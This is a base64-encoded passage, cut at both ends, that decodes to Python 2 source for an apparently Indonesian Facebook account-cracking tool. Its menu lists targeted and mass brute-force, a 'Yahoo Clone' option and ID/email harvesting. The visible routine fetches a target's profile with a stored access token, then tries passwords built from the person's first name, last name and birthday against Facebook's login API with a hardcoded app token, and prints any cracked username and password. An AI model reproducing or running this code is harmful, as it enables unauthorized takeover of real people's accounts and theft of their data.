mb3VuZCcKCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDllXHhiOV0gXHgxYlsxOzkybUxva2FzaVx4MWJbMTs5N20gICAgICA6ICcgKyB6Wydsb2NhdGlvbiddWyduYW1lJ10KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bP10gXHgxYlsxOzkybUxva2FzaVx4MWJbMTs5N20gICAgICA6IFx4MWJbMTs5MW1UaWRhayBBZGEnCgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtTGFoaXJceDFiWzE7OTdtICAgICAgOiAnICsgelsnYmlydGhkYXknXQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bP10gXHgxYlsxOzkybUxhaGlyXHgxYlsxOzk3bSAgICAgIDogXHgxYlsxOzkxbVRpZGFrIEFkYScKCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtU2Vrb2xhaFx4MWJbMTs5N20gICAgICAgIDogJwogICAgICAgICAgICAgICAgICAgIGZvciBxIGluIHpbJ2VkdWNhdGlvbiddOgogICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbSAgICAgICAgICAgICAgICAgICB+IFx4MWJbMTs5N20nICsgcVsnc2Nob29sJ11bJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbSAgICAgICAgICAgICAgICAgICB+IFx4MWJbMTs5MW1UaWRhayBBZGEnCgogICAgICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgIG1lbnUoKQogICAgZWxzZToKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceGUyXHg5Y1x4OTZdIFBlbmdndW5hIFRpZGFrIEFkYScKICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgIG1lbnUoKQoKCmRlZiBtZW51X2hhY2soKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCcKICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMSkKICAgICAgICBsb2dpbigpCgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCBsb2dvCiAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG0xLiBNaW5pIEhhY2sgRmFjZWJvb2sgKFx4MWJbMTs5Mm1UYXJnZXRceDFiWzE7OTdtKScKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtMi4gTXVsdGkgQnJ1dGVmb3JjZSBGYWNlYm9vaycKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtMy4gU3VwZXIgTXVsdGkgQnJ1dGVmb3JjZSBGYWNlYm9vaycKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtNC4gQnJ1dGVGb3JjZSAoXHgxYlsxOzkybVRhcmdldFx4MWJbMTs5N20pJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG01LiBZYWhvbyBDbG9uZScKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtNi4gQW1iaWwgSUQvRW1haWwvSFAnCiAgICBwcmludCAn4pWRLT4gXHgxYlsxOzMxOzQwbTAuIEJhY2snCiAgICBwcmludCAnXHgxYlsxOzM3OzQwbeKVkScKICAgIGhhY2tfcGlsaWgoKQoKCmRlZiBoYWNrX3BpbGloKCk6CiAgICBoYWNrID0gcmF3X2lucHV0KCfilZrilZBceDFiWzE7OTFt4pa2XHgxYlsxOzk3bSAnKQogICAgaWYgaGFjayA9PSAnJzoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBDYW5cJ3QgZW1wdHknCiAgICAgICAgaGFja19waWxpaCgpCiAgICBlbHNlOgogICAgICAgIGlmIGhhY2sgPT0gJzEnOgogICAgICAgICAgICBtaW5pKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiBoYWNrID09ICcyJzoKICAgICAgICAgICAgICAgIGNyYWNrKCkKICAgICAgICAgICAgICAgIGhhc2lsKCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGlmIGhhY2sgPT0gJzMnOgogICAgICAgICAgICAgICAgICAgIHN1cGVyKCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgaWYgaGFjayA9PSAnNCc6CiAgICAgICAgICAgICAgICAgICAgICAgIGJydXRlKCkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBoYWNrID09ICc1JzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1lbnVfeWFob28oKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaGFjayA9PSAnNic6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ3JhYigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGhhY2sgPT0gJzAnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZW51KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceGUyXHg5Y1x4OTZdIFx4MWJbMTs5N20nICsgaGFjayArICcgXHgxYlsxOzkxbU5vdCBmb3VuZCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaGFja19waWxpaCgpCgoKZGVmIG1pbmkoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCcKICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMSkKICAgICAgICBsb2dpbigpCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50IGxvZ28KICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyBJTkZPIF0gVGFyZ2V0IG11c3QgYmUgeW91ciBmcmllbmQgIScKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlkID0gcmF3X2lucHV0KCdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1JRCBUYXJnZXQgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcpCiAgICAgICAgICAgIGphbGFuKCdceDFiWzE7OTFtW1x4ZTJceDljXHhiYV0gXHgxYlsxOzkybVBsZWFzZSB3YWl0IFx4MWJbMTs5N20uLi4nKQogICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nICsgaWQgKyAnP2FjY2Vzc190b2tlbj0nICsgdG9rZXQpCiAgICAgICAgICAgIGEgPSBqc29uLmxvYWRzKHIudGV4dCkKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtTmFtZVx4MWJbMTs5N20gOiAnICsgYVsnbmFtZSddCiAgICAgICAgICAgIGphbGFuKCdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1DaGVja2luZyBceDFiWzE7OTdtLi4uJykKICAgICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgICAgICBqYWxhbignXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtT3BlbiBzZWN1cml0eSBceDFiWzE7OTdtLi4uJykKICAgICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgICAgICBqYWxhbignXHgxYlsxOzkxbVtceGUyXHg5Y1x4YmFdIFx4MWJbMTs5Mm1QbGVhc2Ugd2FpdCBceDFiWzE7OTdtLi4uJykKICAgICAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICAgICAgcHoxID0gYVsnZmlyc3RfbmFtZSddICsgJzEyMycKICAgICAgICAgICAgZGF0YSA9IHVybGxpYi51cmxvcGVuKCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9JyArIGlkICsgJyZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9JyArIHB6MSArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYnKQogICAgICAgICAgICB5ID0ganNvbi5sb2FkKGRhdGEpCiAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHk6CiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtRm91bmRlZC4nCiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceDFiWzE7OTZtXHhlMlx4OWNceDkzXHgxYlsxOzkxbV0gXHgxYlsxOzkybU5hbWVceDFiWzE7OTdtICAgICA6ICcgKyBhWyduYW1lJ10KICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDllXHhiOV0gXHgxYlsxOzkybVVzZXJuYW1lXHgxYlsxOzk3bSA6ICcgKyBpZAogICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtUGFzc3dvcmRceDFiWzE7OTdtIDogJyArIHB6MQogICAgICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgICAgIG1lbnVfaGFjaygpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4geVsnZXJyb3JfbXNnJ106CiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybUZvdW5kZWQuJwogICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFx4MWJbMTs5M21BY2NvdW50IE1heWJlIENoZWNrcG9pbnQnCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHgxYlsxOzk2bVx4ZTJceDljXHg5M1x4MWJbMTs5MW1dIFx4MWJbMTs5Mm1OYW1lXHgxYlsxOzk3bSAgICAgOiAnICsgYVsnbmFtZSddCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtVXNlcm5hbWVceDFiWzE7OTdtIDogJyArIGlkCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtUGFzc3dvcmRceDFiWzE7OTdtIDogJyArIHB6MQogICAgICAgICAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgICAgICAgICAgbWVudV9oYWNrKCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHoyID0gYVsnZmlyc3RfbmFtZSddICsgJzEyMzQ1JwogICAgICAgICAgICAgICAgICAgIGRhdGEgPSB1cmxsaWIudXJsb3BlbignaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPScgKyBpZCArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwejIgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2JykKICAgICAgICAgICAgICAgICAgICB5ID0ganNvbi5sb2FkKGRhdGEpCiAgICAgICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4geToKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybUZvdW5kZWQuJwogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceDFiWzE7OTZtXHhlMlx4OWNceDkzXHgxYlsxOzkxbV0gXHgxYlsxOzkybU5hbWVceDFiWzE7OTdtICAgICA6ICcgKyBhWyduYW1lJ10KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtVXNlcm5hbWVceDFiWzE7OTdtIDogJyArIGlkCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDllXHhiOV0gXHgxYlsxOzkybVBhc3N3b3JkXHgxYlsxOzk3bSA6ICcgKyBwejIKICAgICAgICAgICAgICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgICAgICAgICAgICAgbWVudV9oYWNrKCkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4geVsnZXJyb3JfbXNnJ106CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtRm91bmRlZC4nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBceDFiWzE7OTNtQWNjb3VudCBNYXliZSBDaGVja3BvaW50JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHgxYlsxOzk2bVx4ZTJceDljXHg5M1x4MWJbMTs5MW1dIFx4MWJbMTs5Mm1OYW1lXHgxYlsxOzk3bSAgICAgOiAnICsgYVsnbmFtZSddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceGUyXHg5ZVx4YjldIFx4MWJbMTs5Mm1Vc2VybmFtZVx4MWJbMTs5N20gOiAnICsgaWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDllXHhiOV0gXHgxYlsxOzkybVBhc3N3b3JkXHgxYlsxOzk3bSA6ICcgKyBwejIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZW51X2hhY2soKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHozID0gYVsnbGFzdF9uYW1lJ10gKyAnMTIzJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHVybGxpYi51cmxvcGVuKCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9JyArIGlkICsgJyZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9JyArIHB6MyArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgeSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4geToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtRm91bmRlZC4nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHgxYlsxOzk2bVx4ZTJceDljXHg5M1x4MWJbMTs5MW1dIFx4MWJbMTs5Mm1OYW1lXHgxYlsxOzk3bSAgICAgOiAnICsgYVsnbmFtZSddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtVXNlcm5hbWVceDFiWzE7OTdtIDogJyArIGlkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtUGFzc3dvcmRceDFiWzE7OTdtIDogJyArIHB6MwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVudV9oYWNrKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHlbJ2Vycm9yX21zZyddOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtRm91bmRlZC4nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFx4MWJbMTs5M21BY2NvdW50IE1heWJlIENoZWNrcG9pbnQnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4MWJbMTs5Nm1ceGUyXHg5Y1x4OTNceDFiWzE7OTFtXSBceDFiWzE7OTJtTmFtZVx4MWJbMTs5N20gICAgIDogJyArIGFbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceGUyXHg5ZVx4YjldIFx4MWJbMTs5Mm1Vc2VybmFtZVx4MWJbMTs5N20gOiAnICsgaWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtUGFzc3dvcmRceDFiWzE7OTdtIDogJyArIHB6MwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZW51X2hhY2soKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxhaGlyID0gYVsnYmlydGhkYXknXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwejQgPSBsYWhpci5yZXBsYWNlKCcvJywgJycpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEgPSB1cmxsaWIudXJsb3BlbignaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPScgKyBpZCArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwejQgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2JykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiB5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybUZvdW5kZWQuJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHgxYlsxOzk2bVx4ZTJceDljXHg5M1x4MWJbMTs5MW1dIFx4MWJbMTs5Mm1OYW1lXHgxYlsxOzk3bSAgICAgOiAnICsgYVsnbmFtZSddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceGUyXHg5ZVx4YjldIFx4MWJbMTs5Mm1Vc2VybmFtZVx4MWJbMTs5N20gOiAnICsgaWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDllXHhiOV0gXHgxYlsxOzkybVBhc3N3b3JkXHgxYlsxOzk3bSA6ICcgKyBwejQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZW51X2hhY2soKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHlbJ2Vycm9yX21zZyddOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1Gb3VuZGVkLicKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBceDFiWzE7OTNtQWNjb3VudCBNYXliZSBDaGVja3BvaW50JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4MWJbMTs5Nm1ceGUyXHg5Y1x4OTNceDFiWzE7OTFtXSBceDFiWzE7OTJtTmFtZVx4MWJbMTs5N20gICAgIDogJyArIGFbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDllXHhiOV0gXHgxYlsxOzkybVVzZXJuYW1lXHgxYlsxOzk3bSA6ICcgKyBpZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDllXHhiOV0gXHgxYlsxOzkybVBhc3N3b3JkXHgxYlsxOzk3bSA6ICcgKyBwejQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1lbnVfaGFjaygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB6NSA9ICgnc2F5YW5nJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gdXJsbGliLnVybG9wZW4oJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0nICsgaWQgKyAnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nICsgcHo1ICsgJyZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1Gb3VuZGVkLicKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHgxYlsxOzk2bVx4ZTJceDljXHg5M1x4MWJbMTs5MW1dIFx4MWJbMTs5Mm1OYW1lXHgxYlsxOzk3bSAgICAgOiAnICsgYVsnbmFtZSddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDllXHhiOV0gXHgxYlsxOzkybVVzZXJuYW1lXHgxYlsxOzk3bSA6ICcgKyBpZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceGUyXHg5ZVx4YjldIFx4MWJbMTs5Mm1QYXNzd29yZFx4MWJbMTs5N20gOiAnICsgcHo1CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1lbnVfaGFjaygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHlbJ2Vycm9yX21zZyddOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybUZvdW5kZWQuJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gXHgxYlsxOzkzbUFjY291bnQgTWF5YmUgQ2hlY2twb2ludCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4MWJbMTs5Nm1ceGUyXHg5Y1x4O